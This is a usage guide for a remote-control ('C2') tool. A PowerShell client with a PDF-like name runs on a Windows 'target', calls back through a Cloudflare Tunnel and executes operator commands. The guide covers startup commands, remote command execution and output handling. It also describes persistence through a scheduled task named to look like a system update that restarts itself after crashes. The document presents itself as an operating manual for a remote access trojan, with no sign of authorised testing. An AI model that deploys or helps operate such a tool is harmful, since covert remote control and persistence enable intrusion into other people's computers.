# Shell C2 — Usage Guide

## Architecture

```
[Mac] server.py  ←—Cloudflare Tunnel—→  [Windows] pdf2.ps1
  operator types commands                 executes & streams output back
```

- `server.py` runs on your **Mac** — your operator terminal.
- `pdf2.ps1` runs on the **Windows** target, connects back via Cloudflare Tunnel, executes commands, and streams output back.

---

## Starting Up (Order Matters)

Always start in this order to avoid connection errors:

```bash
# 1. Start the Python server first
python3 server.py

# 2. Start the Cloudflare tunnel (in a separate terminal)
cloudflared tunnel --config ~/.cloudflared/config.yml run hostel-mac

# 3. Run pdf2.ps1 on the Windows target
```

> **Why order matters:** If the tunnel starts before `server.py`, cloudflared can't reach port 4444 and logs `connection refused`. The Windows client will retry with exponential backoff automatically once the server is up.

---

## Operator Commands

Type these at the `shell>` prompt — they are **not** sent to the remote shell.

| Command           | What it does                                               |
| ----------------- | ---------------------------------------------------------- |
| `help`            | Show available built-in commands                           |
| `status`          | Check if client is online and whether a command is running |
| `cancel`          | Abort the currently running remote command                 |
| `exit`            | Tell the Windows client to shut itself down                |
| _(anything else)_ | Sent as a shell command to the remote Windows machine      |

---

## Cancelling a Running Command

**Two ways:**

**1. Keyboard shortcut — `Ctrl+X`** _(recommended)_
Press `Ctrl+X` at any time while a command is running. This is bound to cancel so that `Ctrl+C` (which kills the server) isn't needed.

**2. Type `cancel`**

```
shell> cancel
```

The cancel signal is picked up by the client on its next poll (~200ms), stops the command, and replies:

```
[!] Command cancelled by operator.
```

> **Note:** `Ctrl+C` exits `server.py` entirely — use `Ctrl+X` or type `cancel` to stop just the remote command.

---

## Long-Running Commands (No Timeout)

Default timeout is **300 seconds**. For commands that legitimately run longer, prefix with `notimeout:`:

```
shell> notimeout:ping -t google.com
shell> notimeout:netstat -an
```

The header confirms the mode:

```
PS C:\> ping -t google.com [no-timeout]
```

Always use `Ctrl+X` or `cancel` to stop a no-timeout command when done.

---

## Viewing Truncated Output (Full Result)

Output chunks are capped at **32,000 bytes**. If a command produces more, the chunk is trimmed with `[...truncated]`.

**Workaround — pipe to a file and read it in parts:**

```
# Step 1: redirect output to a file on the target
shell> some-command > C:\output.txt

# Step 2: read it in chunks
shell> Get-Content C:\output.txt -TotalCount 100    # first 100 lines
shell> Get-Content C:\output.txt -Tail 100           # last 100 lines
shell> Get-Content C:\output.txt | Select-Object -Skip 100 -First 100  # lines 101–200
```

**Or limit output at the source:**

```
shell> Get-Process | Select-Object -First 30
shell> dir C:\ | Where-Object { $_.Name -like "*.txt" }
```

---

## Checking Client Status

```
shell> status
```

Possible outputs:

| Output                                                     | Meaning                                 |
| ---------------------------------------------------------- | --------------------------------------- |
| `Client ONLINE (IDLE) — last check-in 1.2s ago`            | Connected, waiting for commands         |
| `Client ONLINE (RUNNING command) — last check-in 0.4s ago` | Currently executing                     |
| `Client may be OFFLINE — last check-in 45s ago`            | No recent ping — may have crashed       |
| `No client check-in yet.`                                  | Client has never connected this session |

The server also auto-warns if there's been no check-in for 20+ seconds.

---

## Sending Remote Commands

Just type any PowerShell command at `shell>`:

```
shell> whoami
shell> ipconfig /all
shell> Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

The command header shows prompt path and timeout mode:

```
PS C:\Windows\system32> whoami [300s]
PS C:\> ping -t google.com [no-timeout]
```

---

## Persistence & Crash Recovery

The client installs itself as a Windows Scheduled Task (`SystemManagementUpdate`):

- **Trigger:** At system startup
- **Auto-restart on crash:** Up to 3 restarts, 10-second delay each

Check it in Task Scheduler → `SystemManagementUpdate` → Settings tab.

---

## Log File (`shell.txt`)

Located in the same directory as `pdf2.ps1`. Auto-rotates at 5 MB (old log → `shell.txt.old`).

Common log entries:

| Entry                                    | Meaning                                             |
| ---------------------------------------- | --------------------------------------------------- |
| `Client started. PID=...`                | Client launched                                     |
| `CMD: <command>`                         | Command received from server                        |
| `Created new persistent runspace`        | First command of session (normal)                   |
| `Connection error #N: (530)`             | Cloudflare tunnel not ready yet — client will retry |
| `Connection error #N: (502) Bad Gateway` | Server unreachable — check `server.py` is running   |
| `Command timed out`                      | Command hit 300s limit — use `notimeout:` if needed |
| `Command cancelled`                      | Operator triggered cancel                           |

---

## Troubleshooting

### "connection refused" in cloudflared logs

`server.py` wasn't running when the tunnel started. Start `server.py` first.

### 530 errors in shell.txt

Cloudflare tunnel wasn't established yet when the client started. The client retries automatically with exponential backoff — no action needed if the tunnel comes up within a minute.

### 400 Bad Request / "Unsolicited response on idle HTTP channel"

This was a known bug — fixed. The server now sends `Connection: close` on every response, preventing cloudflared from trying to reuse connections with HTTP/2 frames on an HTTP/1.1 socket.

### Output streaming feels slow

Output streams adaptively: ~200ms when output is flowing, up to 1s when idle. If everything looks slow, check `status` — the client may be offline.

---

## Output Streaming Behaviour

| Condition                  | Flush interval |
| -------------------------- | -------------- |
| Output actively flowing    | ~200 ms        |
| No output for a few cycles | ~500 ms        |
| Idle (no output)           | ~1000 ms       |

---

## Quick Reference

| Action                 | How                                   |
| ---------------------- | ------------------------------------- |
| Cancel running command | `Ctrl+X` or type `cancel`             |
| Kill the server        | `Ctrl+C`                              |
| Run with no timeout    | `notimeout:<command>`                 |
| Check connectivity     | `status`                              |
| Shut down client       | `exit`                                |
| View help              | `help`                                |
| Read long output       | Pipe to file, read with `Get-Content` |
